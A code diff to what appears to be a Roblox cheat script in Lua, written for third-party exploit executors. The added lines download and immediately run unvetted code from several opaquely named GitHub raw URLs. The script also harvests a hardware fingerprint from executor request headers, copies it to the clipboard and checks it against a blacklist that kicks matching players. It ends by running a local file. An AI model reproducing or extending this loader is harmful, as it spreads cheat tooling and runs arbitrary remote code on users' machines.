@@ -1,4 +1,58 @@
 wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/asdasdasdasd/main/lglglglglgl",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/asdasdasdasd/main/glglglglgl",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/sex/main/SEX",true))()
+
+--BLACKLIST--
+local StarterGui = game:GetService("StarterGui")
+local Notify = function(_Title, _Text , Time)
+    StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
+end
+
+local blacklist = {
+"",
+}
+
+function verify()
+local p = game.Players.LocalPlayer
+local n = game.Players.LocalPlayer.Name
+Notify("checking", "if player "..n.." is on the blacklist...", 5)
+for i,v in pairs(blacklist) do
+print(v)
+if hwid == v then setclipboard("error code 1, BLACKLISTED.")  wait(0.1) p:Kick("Blacklisted,alts will make u perm blacklisted with no chance of appeal") end
+end
+wait(0.1)
+Notify("done!", "player "..n.." is not on the blacklist!,loading script..", 5)
+end
+Notify("WARNING", "RECOMMENDED FLUXUS.", 5)
+wait()
+if IsValyse then
+local hwid = gethwid()
+setclipboard(hwid)
+print(hwid)
+verify()
+elseif IsElectron then
+local hwid = gethwid()
+setclipboard(hwid)
+print(hwid)
+verify()
+else
+local http_request = syn and syn.request or request or fluxus.request;
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService("HttpService"):JSONDecode(body)
+local hwid = decoded.headers['Syn-Fingerprint'] or decoded.headers['Flux-Fingerprint'] or decoded.headers['Exploit-Guid'] or decoded.headers['Proto-User-Identifier'] or decoded.headers['Sentinel-Fingerprint'] or decoded.headers['Krnl-Fingerprint']
+setclipboard(hwid)
+print(hwid)
+verify()
+end
+
+
+
+
+
+
+
+--admin
 if isfile("important.lua") then loadstring(readfile('important.lua'))() end
 
 
